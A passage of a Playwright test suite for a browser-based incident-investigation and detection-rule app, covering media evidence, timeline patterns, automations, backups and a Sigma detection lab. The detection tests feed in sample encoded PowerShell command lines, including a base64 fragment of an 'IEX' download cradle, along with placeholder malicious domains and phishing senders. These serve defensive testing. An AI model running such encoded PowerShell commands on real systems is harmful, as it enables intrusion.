    let i = 0; const iv = setInterval(() => { g.fillStyle = i++ % 2 ? '#33c' : '#3c3'; g.fillRect(0, 0, 640, 480); }, 100); await new Promise(r => setTimeout(r, 900)); clearInterval(iv); rec.stop(); await new Promise(r => rec.onstop = r);
    window.__vid = new Blob(ch, { type: 'video/webm' });
  });
  // dropped anywhere on the case
  await page.evaluate(() => { const dt = new DataTransfer(); dt.items.add(new File([window.__png], 'photo.png', { type: 'image/png' })); dt.items.add(new File([window.__vid], 'clip.webm', { type: 'video/webm' }));
    document.querySelector('#main').dispatchEvent(new DragEvent('dragover', { dataTransfer: dt, bubbles: true, cancelable: true })); document.querySelector('#main').dispatchEvent(new DragEvent('drop', { dataTransfer: dt, bubbles: true, cancelable: true })); });
  await expect(page.locator('.md-c')).toHaveCount(2);
  expect(await page.evaluate(() => location.hash)).toBe('#/case/c-lantern/media');   // adding from the Media tab stays there
  // pasted: the same picture again is stored once
  await page.evaluate(() => { const dt = new DataTransfer(); dt.items.add(new File([window.__png], 'image.png', { type: 'image/png' })); document.body.dispatchEvent(new ClipboardEvent('paste', { clipboardData: dt, bubbles: true, cancelable: true })); });
  await expect(page.locator('.md-c')).toHaveCount(3);
  const st = await page.evaluate(async () => { const I = caseMediaItems('c-lantern'), keys = (await IDB.keys()).filter(k => /^file:/.test(k));
    const v = I.find(x => x.k === 'video').a, im = I.find(x => x.a.name === 'photo.png').a;
    return { names: I.map(x => x.a.name).sort(), stored: keys.filter(k => !k.endsWith('.p')).length, prev: keys.filter(k => k.endsWith('.p')).length, vw: v.w, vdur: v.dur == null || v.dur > 0, iw: im.w, shot: I.some(x => /^screenshot-/.test(x.a.name)) }; });
  expect(st).toMatchObject({ stored: 2, prev: 2, vw: 640, vdur: true, iw: 640, shot: true });
  await expect(page.locator('.md-c img[src]').first()).toBeVisible();
  // the video plays in the app
  await page.click('.md-c:has-text("clip.webm") .md-th');
  await expect.poll(() => page.evaluate(() => { const v = document.querySelector('#dlg video'); return v ? v.readyState : -1; })).toBeGreaterThan(0);
  await page.evaluate(() => closeDlg());
  // too big to keep: recorded with its fingerprint
  await page.evaluate(() => attachFiles([new File([new Uint8Array(51 * 1048576)], 'huge.mp4', { type: 'video/mp4' })]));
  await expect(page.locator('.md-c.big')).toHaveCount(1);
  expect(await page.evaluate(() => { const r = DB.records.find(x => x.big); return [r.big.size, r.big.sha256.length, /not stored/.test(r.title)]; })).toEqual([51 * 1048576, 64, true]);
  // a saved web page
  const mh = require('fs').readFileSync(require('path').resolve(__dirname, 'fixtures', 'forum-post.mhtml'));
  page.once('filechooser', fc => fc.setFiles({ name: 'forum-post.mhtml', mimeType: 'multipart/related', buffer: mh }));
  await page.click('[data-act=mdPage]');
  await expect(page.locator('.md-c:has-text("forum-post.mhtml")')).toHaveCount(1);
  // filters
  await page.click('[data-act=mdKind][data-v=video]'); await expect(page.locator('.md-c')).toHaveCount(2);
  await page.click('[data-act=mdKind][data-v=all]');
  // an Image / video entry gets its own file
  const eid = await page.evaluate(() => { const e = { id: uid('v'), caseId: 'c-lantern', type: 'media', fields: { title: '' }, tags: [], priority: 'medium', created: Date.now(), updated: Date.now() }; normEntry(e); DB.entries.push(e); mutate('e'); selectEntry(e.id); return e.id; });
  await expect(page.locator('#insp [data-act=mdEntryUp]')).toBeVisible();
  await page.evaluate(async id => mediaForEntry(entryById(id), [new File([window.__vid], 'entry.webm', { type: 'video/webm' })]), eid);
  expect(await page.evaluate(id => { const e = entryById(id), r = recById(e.src); return [e.fields.title, e.fields.type, e.fields.resolution, r.att.length]; }, eid)).toEqual(['entry.webm', 'Video', '640×480', 1]);
  // deleting the last record that uses a file removes the file and its preview (no restore point needs them here)
  const gone = await page.evaluate(async () => { const r = DB.records.find(x => x.att && x.att[0].name === 'clip.webm'); const fid = r.att[0].id; SNAPS = []; SNAP_REFS = null; await IDB.set('osintrix-snaps', JSON.stringify([]));
    const others = DB.records.filter(x => x !== r && (x.att || []).some(a => a.id === fid)); others.forEach(o => o.att = o.att.filter(a => a.id !== fid));
    DB.records = DB.records.filter(x => x !== r); dropFilesOf({ kind: 'record', data: { r } }); await new Promise(z => setTimeout(z, 300)); return [!!(await IDB.get('file:' + fid)), !!(await IDB.get('file:' + fid + '.p'))]; });
  expect(gone).toEqual([false, false]);
  // backups: asked with or without files, sizes shown
  await page.evaluate(() => clickAct('exportAll'));
  await expect(page.locator('#dlg')).toContainText('Without files');
  const dl = page.waitForEvent('download'); await page.click('[data-act=bkGo][data-v=nofiles]');
  const o = JSON.parse(require('fs').readFileSync(await (await dl).path(), 'utf8'));
  expect([o.filesLeftOut, o.files]).toEqual([true, undefined]);
  noErrors(errors);
});

test('switching case tabs closes the details panel; a new Image / video entry takes its file in the form', async ({ page }) => {
  const errors = await open(page, '#/case/c-portal/vault');
  await page.evaluate(() => selectEntry(DB.entries.find(e => e.caseId === 'c-portal').id));
  await expect(page.locator('#insp')).toBeVisible();
  await page.evaluate(() => go(caseHash('c-portal', 'overview')));
  expect(await page.evaluate(() => [UI.inspOpen, UI.sel])).toEqual([false, null]);
  // "open in timeline" from the panel still keeps the record selected
  await page.evaluate(() => { UI.sel = { kind: 'rec', id: DB.records.find(r => r.caseId === 'c-portal').id }; UI.inspOpen = true; go(caseHash('c-portal', 'timeline')); });
  expect(await page.evaluate(() => UI.inspOpen)).toBe(true);
  await page.evaluate(() => entryDlg(null, { type: 'media' }));
  const png = await page.evaluate(async () => { const c = document.createElement('canvas'); c.width = 300; c.height = 200; c.getContext('2d').fillRect(0, 0, 300, 200); return [...new Uint8Array(await (await new Promise(r => c.toBlob(r, 'image/png'))).arrayBuffer())]; });
  await page.setInputFiles('#ef-file', { name: 'suspect-profile.png', mimeType: 'image/png', buffer: Buffer.from(png) });
  await expect(page.locator('#ef-resolution')).toHaveValue('300×200');
  await expect(page.locator('#ef-title')).toHaveValue('suspect-profile');
  await page.click('#dlg button[type=submit]');
  await expect(page.locator('#insp .md-ent img[src]')).toBeVisible();
  expect(await page.evaluate(() => { const e = DB.entries[DB.entries.length - 1]; return [e.fields.type, recById(e.src).att[0].name]; })).toEqual(['Image', 'suspect-profile.png']);
  noErrors(errors);
});

test('timeline patterns: first sign of compromise, cleared logs, bursts, quiet periods and time problems, each opening its events', async ({ page }) => {
  const errors = await open(page, '#/case/c-lantern/timeline');
  await page.evaluate(() => { const b = 'logged 2026-09-14T09:00:00Z by the proxy'; DB.records.push({ id: 'rzone', caseId: 'c-lantern', type: 'evidence', title: 'Proxy line', body: b, tsRaw: '', tsZone: 'explicit', ts: Date.parse('2026-09-14T14:00:00Z'), host: 'PX1', source: 'proxy', tags: [], ents: [], answer: '', addedBy: 'You', addedAt: Date.now(), hash: '' },
    { id: 'rfut', caseId: 'c-lantern', type: 'evidence', title: 'Clock wrong', body: '', tsRaw: '', tsZone: 'explicit', ts: Date.now() + 40 * 864e5, host: 'PX1', source: 'x', tags: [], ents: [], answer: '', addedBy: 'You', addedAt: Date.now(), hash: '' }); mutate('t'); });
  await page.click('[data-act=tlMode][data-v=patterns]');
  const first = page.locator('.tlx-c:has-text("Likely first sign of compromise")');
  await expect(first).toContainText('Invoice email delivered to finance');
  await expect(first).toContainText('judged malicious');
  await expect(page.locator('.tlx-c:has-text("Logs were cleared")')).toContainText('Security log cleared on DC01');
  await expect(page.locator('.tlx-c:has-text("Bursts of activity")')).toBeVisible();
  await expect(page.locator('.tlx-c:has-text("Quiet periods")')).toBeVisible();
  const tp = page.locator('.tlx-c:has-text("Time problems")');
  await expect(tp).toContainText('in the future'); await expect(tp).toContainText('5 hours from the time in their own text');
  await expect(page.locator('.tlx-spark')).toBeVisible();
  // a finding opens just its events
  await first.locator('[data-act=tlxWin]').last().click();
  expect(await page.evaluate(() => [UI.tlMode, !!UI.facet.win, UI.facet.win.label])).toEqual(['events', true, 'hour after the first sign']);
  await expect(page.locator('.chip.accent:has-text("hour after the first sign")')).toBeVisible();
  noErrors(errors);
});

test('picture insights: the same picture and the same place across cases, cameras, and signs of editing', async ({ page }) => {
  const errors = await open(page, '#/case/c-lantern/media');
  const jpg = [...require('fs').readFileSync(require('path').resolve(__dirname, 'fixtures', 'photo-gps.jpg'))];
  await page.evaluate(async jpg => { const f = new File([new Uint8Array(jpg)], 'harbour.jpg', { type: 'image/jpeg' });
    const bm = await createImageBitmap(f), c = document.createElement('canvas'); c.width = Math.round(bm.width * .6); c.height = Math.round(bm.height * .6); c.getContext('2d').drawImage(bm, 0, 0, c.width, c.height);
    const small = await new Promise(r => c.toBlob(r, 'image/jpeg', .7));
    draft.caseId = 'c-lantern'; await attachFiles([f]); draft.caseId = 'c-portal'; await attachFiles([new File([small], 'resized.jpg', { type: 'image/jpeg' })]); }, jpg);
  await page.evaluate(() => go(caseHash('c-lantern', 'media'))); await page.click('[data-act=mdView][data-v=pic]');
  await expect(page.locator('.tlx-c:has-text("The same picture, more than once")')).toContainText('also in another case');
  await expect(page.locator('.tlx-c:has-text("Cameras")')).toContainText('Canon');
  // editing signs read from the metadata
  const flags = await page.evaluate(() => [picFlags({ x: { soft: 'Adobe Photoshop 25.0', taken: '2024:05:01 10:00:00', mod: '2024:06:01 10:00:00' } }).map(f => f[1]), picFlags({ type: 'image/jpeg', x: { none: true } }).length]);
  expect(flags[0]).toEqual(['Edited in Adobe Photoshop 25.0', 'Changed 31d 0h after it was taken']); expect(flags[1]).toBe(1);
  // older pictures without fingerprints are read when the view opens
  await page.evaluate(() => { for(const r of DB.records) for(const a of r.att || []){ delete a.dhash; delete a.x; } renderMain(); });
  await expect.poll(() => page.evaluate(() => picAll().every(x => x.a.dhash && x.a.x))).toBe(true);
  noErrors(errors);
});

test('automations: ready-made rules act once on new evidence, log what they did, and arrive switched off from a backup', async ({ page }) => {
  const errors = await open(page, '#/playbooks');
  await page.click('[data-act=pbTab][data-v=auto]');
  for (const id of ['t-store', 't-email', 't-phish']) await page.click(`[data-act=auTpl][data-id=${id}]`);
  await expect(page.locator('.au-r')).toHaveCount(3);
  await page.evaluate(async () => { const c = { id: 'c-mine', code: 'MY-1', name: 'My case', status: 'active', color: '#4f46e5', icon: 'folder', scope: '', created: Date.now() }; normCase(c); DB.cases.push(c);
    await ctiLoad(); ctiAddIocs([{ v: 'evil-cdn.example.net', type: 'domain', threat: 'QakBot' }], 'Test'); mutate('c');
    const body = 'Link to https://evil-cdn.example.net/x and reply to boss.fake@corp-pay.example';
    DB.records.push({ id: 'rph', caseId: 'c-mine', type: 'evidence', title: 'Phishing mail', body, tsRaw: '', tsZone: 'explicit', ts: Date.now() - 36e5, host: 'mail01', source: 'email', tags: ['phishing'], ents: E.extract(body), answer: '', addedBy: 'You', addedAt: Date.now(), hash: '' }); mutate('add'); });
  await expect.poll(() => page.evaluate(() => DB.autoLog.length)).toBeGreaterThanOrEqual(4);
  const r = await page.evaluate(() => ({ v: DB.verdicts['domain:evil-cdn.example.net'], q: DB.records.filter(x => x.caseId === 'c-mine' && x.type === 'lead').length, e: DB.entries.filter(x => x.caseId === 'c-mine').map(primary), demo: DB.autoLog.every(l => l.c === 'c-mine') }));
  expect(r).toMatchObject({ v: 'suspicious', e: ['boss.fake@corp-pay.example'], demo: true }); expect(r.q).toBeGreaterThan(4);
  // nothing repeats on the next change
  const n = await page.evaluate(() => DB.autoLog.length); await page.evaluate(() => mutate('again')); await page.waitForTimeout(1500);
  expect(await page.evaluate(() => DB.autoLog.length)).toBe(n);
  await page.evaluate(() => renderMain()); await expect(page.locator('.au-log li').first()).toBeVisible();
  // a custom rule from the form
  await page.click('[data-act=auNew]'); await page.fill('#auName', 'Watch hashes'); await page.uncheck('[name=auK][value=ip]'); await page.uncheck('[name=auK][value=domain]'); await page.check('[name=auK][value=hash]');
  await page.uncheck('[name=auDo][value=store]'); await page.check('[name=auDo][value=watch]'); await page.click('#dlg button[type=submit]');
  await expect(page.locator('.au-r:has-text("Watch hashes")')).toContainText('file hash');
  // a backup cannot bring in automations that act by themselves
  const bk = await page.evaluate(async () => JSON.stringify(await backupObject()));
  page.once('filechooser', fc => fc.setFiles({ name: 'b.json', mimeType: 'application/json', buffer: Buffer.from(bk) }));
  await page.evaluate(() => clickAct('importAll')); await page.click('#dlg button:has-text("Import backup")');
  await expect.poll(() => page.evaluate(() => DB.autos.length && DB.autos.every(R => R.on === false))).toBe(true);
  noErrors(errors);
});

test('since you were last here: a case lists what arrived while it was closed', async ({ page }) => {
  const errors = await open(page, '#/case/c-portal/overview');
  await page.evaluate(() => go('#/home'));
  await page.evaluate(() => { DB.prefs.seen['c-portal'] = Date.now() - 2 * 864e5;
    const b = 'Callback to 203.0.113.47 seen again'; DB.records.push({ id: 'rnew', caseId: 'c-portal', type: 'evidence', title: 'New callback', body: b, tsRaw: '', tsZone: 'explicit', ts: Date.now() - 6e5, host: 'WEB02', source: 'edr', tags: [], ents: E.extract(b), answer: '', addedBy: 'Automation', addedAt: Date.now() - 36e5, hash: '' });
    DB.records.push({ id: 'rnew2', caseId: 'c-lantern', type: 'evidence', title: 'Also here', body: b, tsRaw: '', tsZone: 'explicit', ts: Date.now() - 6e5, host: 'X', source: 'edr', tags: [], ents: E.extract(b), answer: '', addedBy: 'You', addedAt: Date.now() - 36e5, hash: '' }); mutate('x'); });
  await page.evaluate(() => go(caseHash('c-portal', 'overview')));
  const card = page.locator('.act-c'); await expect(card).toContainText('Since you were last here');
  await expect(card).toContainText('added by Automation'); await expect(card).toContainText('turned up in another case');
  await card.locator('[data-act=tlFrom]').click();
  await expect(page.locator('#tlV .ev')).toHaveCount(1);
  noErrors(errors);
});

test('backup reminders: due after a week of own work, shown on the dashboard and in the sidebar, folder backup offered', async ({ page }) => {
  const errors = await open(page, '#/home');
  await page.evaluate(() => { const c = { id: 'c-own', code: 'OWN-1', name: 'Own', status: 'active', color: '#4f46e5', icon: 'folder', scope: '', created: Date.now() }; normCase(c); DB.cases.push(c);
    for (let i = 0; i < 4; i++) DB.records.push({ id: 'ro' + i, caseId: 'c-own', type: 'evidence', title: 'x' + i, body: '', tsRaw: '', tsZone: '', ts: null, host: '', source: '', tags: [], ents: [], answer: '', addedBy: 'You', addedAt: Date.now(), hash: '' });
    DB.prefs.firstUse = Date.now() - 10 * 864e5; DB.prefs.lastExport = 0; DB.prefs.remindAt = 0; mutate('own'); renderAll(); });
  await expect(page.locator('.bkp')).toContainText('You have not backed up yet');
  await expect(page.locator('.sidefoot.due')).toContainText('Backup due');
  await page.click('.bkp [data-act=bkpLater]');
  await expect(page.locator('.bkp')).toHaveCount(0); await expect(page.locator('.sidefoot.due')).toHaveCount(0);
  noErrors(errors);
});

test('guided tour walks through the demo case and can be left with Escape', async ({ page }) => {
  const errors = await open(page, '#/help');
  await page.click('[data-act=tourStart]');
  for (let i = 0; i < 7; i++) { await expect(page.locator('#tourCard .tour-n')).toHaveText(`${i + 1} of 8`); await expect(page.locator('#tourRing')).toBeVisible(); await page.click('[data-act=tourNext]'); }
  await expect(page.locator('#tourCard')).toContainText('Now your own case');
  await page.keyboard.press('Escape'); await expect(page.locator('#tourCard')).toHaveCount(0);
  noErrors(errors);
});

test('fast long lists: 50,000 indicators and 5,000 rules draw only what is on screen', async ({ page }) => {
  const errors = await open(page, '#/home');
  await page.evaluate(async () => { await ctiLoad(); const L = []; for (let i = 0; i < 50000; i++) L.push({ v: '10.' + (i >> 16 & 255) + '.' + (i >> 8 & 255) + '.' + (i & 255), type: 'ipv4', tags: ['bulk'] }); ctiAddIocs(L, 'Bulk');
    const base = DB.rules[0]; for (let i = 0; i < 5000; i++) DB.rules.push({ ...base, id: 'rx' + i, title: 'Rule ' + i }); mutate('x'); UI.itab = 'iocs'; go('#/feeds'); });
  await expect(page.locator('#ioV [data-vi]').first()).toBeVisible();
  expect(await page.locator('#ioV [data-vi]').count()).toBeLessThan(120);
  const t = await page.evaluate(() => { const t0 = performance.now(); renderMain(); return performance.now() - t0; }); expect(t).toBeLessThan(400);
  await page.evaluate(() => { DB.prefs.dLay = 'table'; UI.dview = 'rules'; go('#/detections'); });
  await page.evaluate(() => { const v = document.querySelector('[data-act=dLay][data-v=table], [data-act=rLay][data-v=table]'); if (v) v.click(); });
  await expect(page.locator('#dtV [data-vi], #ideV [data-vi]').first()).toBeVisible();
  expect(await page.locator('#dtV [data-vi], #ideV [data-vi]').count()).toBeLessThan(120);
  noErrors(errors);
});

test('a large workspace stays usable: 50,000 records and their indicators', async ({ page }) => {
  test.setTimeout(180_000);
  const errors = await open(page, '#/home');
  const r = await page.evaluate(async () => { const t0 = Date.UTC(2026, 8, 1); const hosts = ['WEB01', 'DB01', 'WS-07', 'DC01'];
    for (let i = 0; i < 50000; i++) { const b = `conn ${i} from 198.51.${(i >> 8) & 255}.${i & 255} to evil${i % 300}.example.org user u${i % 50}`;
      DB.records.push({ id: 'big' + i, caseId: 'c-portal', type: 'evidence', title: 'Event ' + i, body: b, tsRaw: '', tsZone: 'explicit', ts: t0 + i * 37000, host: hosts[i % 4], source: 'gen', tags: [], ents: E.extract(b), answer: '', addedBy: 'You', addedAt: Date.now(), hash: '' }); }
    mutate('big'); const out = {};
    for (const tab of ['overview', 'timeline', 'entities']) { const s = performance.now(); location.hash = caseHash('c-portal', tab); onRoute(); out[tab] = Math.round(performance.now() - s); }
    UI.tlMode = 'patterns'; let s = performance.now(); renderMain(); out.patterns = Math.round(performance.now() - s);
    out.heap = performance.memory ? Math.round(performance.memory.usedJSHeapSize / 1048576) : 0; return out; });
  console.log('large workspace', JSON.stringify(r));
  for (const k of ['overview', 'timeline', 'entities', 'patterns']) expect(r[k]).toBeLessThan(6000);
  if (r.heap) expect(r.heap).toBeLessThan(1500);
  noErrors(errors);
});

test('newer screens fit a phone: patterns, media, picture insights, automations, tour @phone', async ({ page }) => {
  const errors = await open(page, '#/case/c-lantern/timeline');
  const fits = () => page.evaluate(() => document.documentElement.scrollWidth <= innerWidth + 1 && [...document.querySelectorAll('#main .card')].every(c => c.getBoundingClientRect().right <= innerWidth + 1));
  await page.evaluate(() => { UI.tlMode = 'patterns'; renderMain(); }); await expect(page.locator('.tlx-c').first()).toBeVisible(); expect(await fits()).toBe(true);
  await page.evaluate(() => go(caseHash('c-lantern', 'media'))); await expect(page.locator('.md-head, .md-empty').first()).toBeVisible(); expect(await fits()).toBe(true);
  await page.evaluate(() => { UI.mdV = 'pic'; renderMain(); }); expect(await fits()).toBe(true);
  await page.evaluate(() => { UI.pbTab = 'auto'; go('#/playbooks'); }); await expect(page.locator('.au-intro')).toBeVisible(); expect(await fits()).toBe(true);
  await page.evaluate(() => tourStart()); await expect(page.locator('#tourCard')).toBeVisible();
  expect(await page.evaluate(() => { const r = $('tourCard').getBoundingClientRect(); return r.left >= 0 && r.right <= innerWidth; })).toBe(true);
  noErrors(errors);
});

test('detection lab: Sigma to SIEM queries, tests kept with a rule, the evasion check and its fix, and a draft rule from selected events', async ({ page }) => {
  const errors = await open(page, '#/detections');
  const q = await page.evaluate(() => { ensureRules(); const r = DB.rules.find(x => x.title === 'PowerShell Encoded Command Execution'); const o = {}; for (const b of Object.keys(DL_BACK)) o[b] = sigmaToQuery(r.code, b).q; return o; });
  expect(q.splunk).toContain('EventCode=1'); expect(q.splunk).toContain('CommandLine="*-enc*"');
  expect(q.kql).toContain('DeviceProcessEvents'); expect(q.kql).toContain('ProcessCommandLine contains "-enc"');
  expect(q.esql).toContain('process.command_line'); expect(q.aql).toContain(`"Process CommandLine" ILIKE '%-enc%'`);
  // operators: not, 1 of, null, cidr, re
  const q2 = await page.evaluate(() => sigmaToQuery(`logsource:\n    category: network_connection\n    product: windows\ndetection:\n    sel_a:\n        DestinationIp|cidr: 10.0.0.0/8\n    sel_b:\n        Image|re: '.*\\\\evil[0-9]+\\.exe'\n    filter:\n        User: null\n    condition: 1 of sel_* and not filter`, 'kql').q);
  expect(q2).toContain('ipv4_is_in_range(RemoteIP, "10.0.0.0/8")'); expect(q2).toContain('matches regex'); expect(q2).toContain('not(isempty(AccountName))');
  // field names can be remapped
  await page.evaluate(() => { const r = DB.rules.find(x => x.title === 'PowerShell Encoded Command Execution'); UI.rule = r.id; UI.ropen = true; UI.rtab = 'queries'; UI.dlB = 'esql'; renderMain(); });
  await page.locator('.dl-map summary').click(); await page.fill('#dlMap', 'CommandLine = process.args'); await page.click('[data-act=dlMapSave]');
  await expect(page.locator('#dlQ')).toContainText('process.args');
  // evasion check, then the one-click fix
  await page.click('[data-rtab=evasion]');
  await expect(page.locator('.dl-ev li.bad:has-text("Renamed the program")')).toContainText("OriginalFileName: 'PowerShell.EXE'");
  await expect(page.locator('.dl-ev li.bad:has-text("Used / or an en dash")')).toBeVisible();
  await page.locator('[data-act=dlFixDash]').first().click();
  await expect(page.locator('.dl-ev li.ok:has-text("Used / or an en dash")')).toBeVisible();
  // tests run in the editor and again on save
  await page.click('[data-rtab=tests]');
  await page.fill('#dlTestIn', 'Image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" CommandLine="powershell /enc SQBFAFgA"'); await page.click('[data-act=dlTestAdd][data-v=hit]');
  await page.fill('#dlTestIn', 'Image="C:\\Windows\\System32\\cmd.exe" CommandLine="cmd /c dir"'); await page.click('[data-act=dlTestAdd][data-v=miss]');
  await expect(page.locator('.dl-sum')).toContainText('All 2 tests pass');
  await page.click('form.rx button[type=submit]'); await expect(page.locator('#toastMsg')).toContainText('Rule saved');
  await page.evaluate(() => { const ta = $('rCode'); ta.value = ta.value.replace(/\|windash/g, ''); ta.dispatchEvent(new Event('input', { bubbles: true })); });
  await page.click('form.rx button[type=submit]'); await expect(page.locator('#toastMsg')).toContainText('1 of 2 tests now fail');
  // the engine: windash, base64offset, null
  const eng = await page.evaluate(() => { const ev = (code, text) => sigmaEval(sigmaParse(code), recFields({ title: '', body: text, host: '', source: '', tags: [], ents: [] }));
    return [ev("detection:\n    s:\n        CommandLine|windash|contains: ' -nop'\n    condition: s", 'CommandLine="powershell /nop x"'),
      ev("detection:\n    s:\n        CommandLine|base64offset|contains: 'IEX'\n    condition: s", 'CommandLine="powershell -e SUVYIChOZXc="'),
      ev("detection:\n    s:\n        Image|endswith: '\\\\cmd.exe'\n        User: null\n    condition: s", 'Image="C:\\Windows\\cmd.exe"')]; });
  expect(eng).toEqual([true, true, true]);
  // a draft rule from events in a timeline, with its tests
  await page.evaluate(() => { const ids = DB.records.filter(r => r.caseId === 'c-lantern' && /powershell/i.test(r.body)).slice(0, 2).map(r => r.id); UI.evPick = new Set(ids); dlDraftFromPick(); });
  await expect(page.locator('#toastMsg')).toContainText('Draft rule made');
  expect(await page.evaluate(() => { const R = DB.rules[0]; return [/^detection:/m.test(R.code), R.tests.filter(t => t.kind === 'hit').length >= 1, dlRunTests(R).filter(x => x.t.kind === 'hit').every(x => x.ok)]; })).toEqual([true, true, true]);
  noErrors(errors);
});

test('notes: a formatting bar for to-dos, bullets, headings and bold; Enter continues a list', async ({ page }) => {
  const errors = await open(page, '#/notes');
  await page.click('#nq-g'); await page.keyboard.type('Plan'); await page.keyboard.press('Shift+Enter');
  await page.click('#nq-g + .nqbar [data-act=nFmt][data-v=todo]'); await page.keyboard.type('Pull proxy logs'); await page.keyboard.press('Enter'); await page.keyboard.type('Call the bank'); await page.keyboard.press('Enter'); await page.keyboard.press('Enter');
  await page.click('#nq-g + .nqbar [data-act=nFmt][data-v=h]'); await page.keyboard.type('Later');
  await page.keyboard.press('Shift+Enter'); await page.click('#nq-g + .nqbar [data-act=nFmt][data-v=bullet]'); await page.keyboard.type('a <b>tag</b> and '); await page.keyboard.press('Control+b'); await page.keyboard.type('bold');
  expect(await page.inputValue('#nq-g')).toBe('Plan\n[ ] Pull proxy logs\n[ ] Call the bank\n# Later\n- a <b>tag</b> and **bold**');
  await page.keyboard.press('Control+Enter');
  const card = page.locator('.note-card:has-text("Call the bank")');
  await expect(card.locator('.ntask')).toHaveCount(2); await expect(card.locator('h4')).toHaveText('Later'); await expect(card.locator('.nli b')).toHaveText('bold');
  await expect(card.locator('.nli')).toContainText('a <b>tag</b> and');   // typed markup stays text
  // the same bar in the edit dialog
  await card.locator('[data-act=nEdit]').click(); await expect(page.locator('#dlg .nfmt')).toBeVisible();
  noErrors(errors);
});

test('a new rule opens its editor from any Detections view; vault cards and the vault list say what matters', async ({ page }) => {
  const errors = await open(page, '#/detections');
  for (const view of ['coverage', 'health']) {
    await page.evaluate(v => { UI.dview = v; renderMain(); }, view);
    const n = await page.evaluate(() => DB.rules.length);
    await page.locator('.page [data-act=rNew]').first().click(); await page.click('.ctx-it:has-text("Sigma")');
    await expect(page.locator('form.rx')).toBeVisible(); expect(await page.evaluate(() => [UI.dview, DB.rules.length])).toEqual(['rules', n + 1]);
  }
  await page.evaluate(() => { DB.watch = { 'email:billing@lantern-invoice.example': { at: Date.now() } }; mutate('w'); go(caseHash('c-lantern', 'vault')); });
  const card = page.locator('.ec2[data-id=v-sender]');
  await expect(card).toHaveClass(/bad/); await expect(card.locator('.ec-sig')).toContainText('Malicious'); await expect(card.locator('.ec-sig')).toContainText('1 record');
  await expect(card.locator('.ec-sig')).toContainText('links:'); await expect(card.locator('.ec-w')).toBeVisible();
  await expect(page.locator('.ec2:has-text("203.0.113.47") .ec-also')).toContainText('TN-2026-011');   // also in another case
  await expect(page.locator('.ec2 dd:text-is("—")')).toHaveCount(0);   // empty fields are not shown
  await page.click('[data-act=vLay][data-v=list]');
  await expect(page.locator('.vl-t tbody tr')).toHaveCount(await page.evaluate(() => DB.entries.filter(e => e.caseId === 'c-lantern').length));
  await page.click('[data-act=vSort][data-v=recs]');
  const first = await page.locator('.vl-t tbody tr').first().locator('.vl-v').textContent(); expect(first).toContain('203.0.113.47');
  await page.locator('.vl-t tbody tr').first().click(); await expect(page.locator('#insp')).toBeVisible();
  noErrors(errors);
});

test('today, duplicates and the attack chain', async ({ page }) => {
  const errors = await open(page, '#/today');
  // demo cases until there is an own case; overdue notes come first
  await expect(page.locator('.ph .sub')).toContainText('from the demo cases');
  await expect(page.locator('.td-h').first()).toContainText('Now');
  await expect(page.locator('.td-l').first()).toContainText('Overdue since 2026-09-17: Before handoff');
  await expect(page.locator('.td-l')).toContainText(['open questions']);
  // an unjudged lookup hit in an own case goes to the top
  await page.evaluate(() => { const c = { id: 'c-own', code: 'OWN-1', name: 'Own', status: 'active', color: '#4f46e5', icon: 'folder', scope: '', created: Date.now() }; normCase(c); DB.cases.push(c);
    const b = 'beacon to 203.0.113.99'; DB.records.push({ id: 'ro1', caseId: 'c-own', type: 'evidence', title: 'Beacon', body: b, tsRaw: '', tsZone: 'explicit', ts: Date.now(), host: 'H', source: 's', tags: [], ents: E.extract(b), answer: '', addedBy: 'You', addedAt: Date.now(), hash: '' });
    ctiEnsure(); DB.intel.lookHist = [{ k: 'ipv4', v: '203.0.113.99', at: Date.now(), band: 'malicious', score: 88 }]; mutate('x'); renderMain(); });
  await expect(page.locator('.td-l').first()).toContainText('a lookup flagged, with no verdict from you');
  await expect(page.locator('.ph .sub')).not.toContainText('demo');
  await page.locator('.td-l li:has-text("a lookup flagged") [data-act=tdGo]').click();
  await expect(page.locator('#insp')).toContainText('203.0.113.99');
  // duplicates: same email written differently and the same person with the words swapped
  await page.evaluate(() => { const mk = (type, f, tags) => { const e = { id: uid('v'), caseId: 'c-lantern', type, fields: f, priority: 'critical', starred: false, tags, notes: 'second copy', src: '', created: Date.now() }; normEntry(e); DB.entries.push(e); return e; };
    const a = mk('email', { email: 'Billing@lantern-invoice[.]example', provider: 'other.example' }, ['dup']); mk('person', { name: 'Okafor Jordan' }, []);
    DB.links.push({ id: 'lx', caseId: 'c-lantern', a: a.id, b: DB.entries.find(e => e.id === 'v-actor').id, label: 'sent by', conf: 2 }); mutate('d'); go(caseHash('c-lantern', 'vault')); });
  await page.click('[data-act=dupOpen]');
  await expect(page.locator('.dp-g')).toHaveCount(2);
  const n0 = await page.evaluate(() => DB.entries.length);
  await page.locator('.dp-g:has-text("Email address") [data-act=dupMerge]').click();
  const m = await page.evaluate(() => { const e = DB.entries.find(x => x.id === 'v-sender'); return [DB.entries.length, e.tags.includes('dup'), e.priority, /Also recorded as/.test(e.notes), DB.links.filter(l => l.a === 'v-sender' || l.b === 'v-sender').some(l => l.label === 'sent by')]; });
  expect(m).toEqual([n0 - 1, true, 'critical', true, true]);
  await page.click('#toastBtn'); expect(await page.evaluate(() => DB.entries.length)).toBe(n0);   // the merge can be undone
  await page.evaluate(() => dupDlg()); await page.locator('.dp-g:has-text("Person") [data-act=dupNot]').click();
  await expect(page.locator('.dp-g:has-text("Person")')).toHaveCount(0);   // "not the same" is remembered
  // the attack chain: stages from tags, recognised behaviour and techniques; gaps in the middle named
  await page.evaluate(() => { closeDlg(); UI.tlMode = 'chain'; go(caseHash('c-lantern', 'timeline')); });
  await expect(page.locator('.ch-s.on[aria-label="Initial Access"]')).toContainText('Invoice email delivered to finance');
  await expect(page.locator('.ch-s.on[aria-label="Persistence"]')).toContainText('Scheduled task');
  await expect(page.locator('.ch-s.on[aria-label="Defense Impairment"], .ch-s.on[aria-label="Defense Evasion"]').first()).toContainText('log');
  await expect(page.locator('.ch-sum')).toContainText('That is where to look next');
  await page.locator('.ch-s.ch-gap [data-act=chRules]').first().click();
  await expect(page.locator('.chip.accent:has-text("Stage:")')).toBeVisible();
  noErrors(errors);
});

test('detections: pick several rules to star, download or delete together; discard changes only when there are some', async ({ page }) => {
  const errors = await open(page, '#/detections');
  await page.evaluate(() => { DB.prefs.rlay = 'table'; UI.dview = 'rules'; UI.dq = 'powershell'; renderMain(); });
  const shown = await page.evaluate(() => UI.rShown.length); expect(shown).toBeGreaterThan(2);
  await expect(page.locator('#rbk')).toBeHidden();
  const boxes = page.locator('.dt tbody [data-act=rPick]');
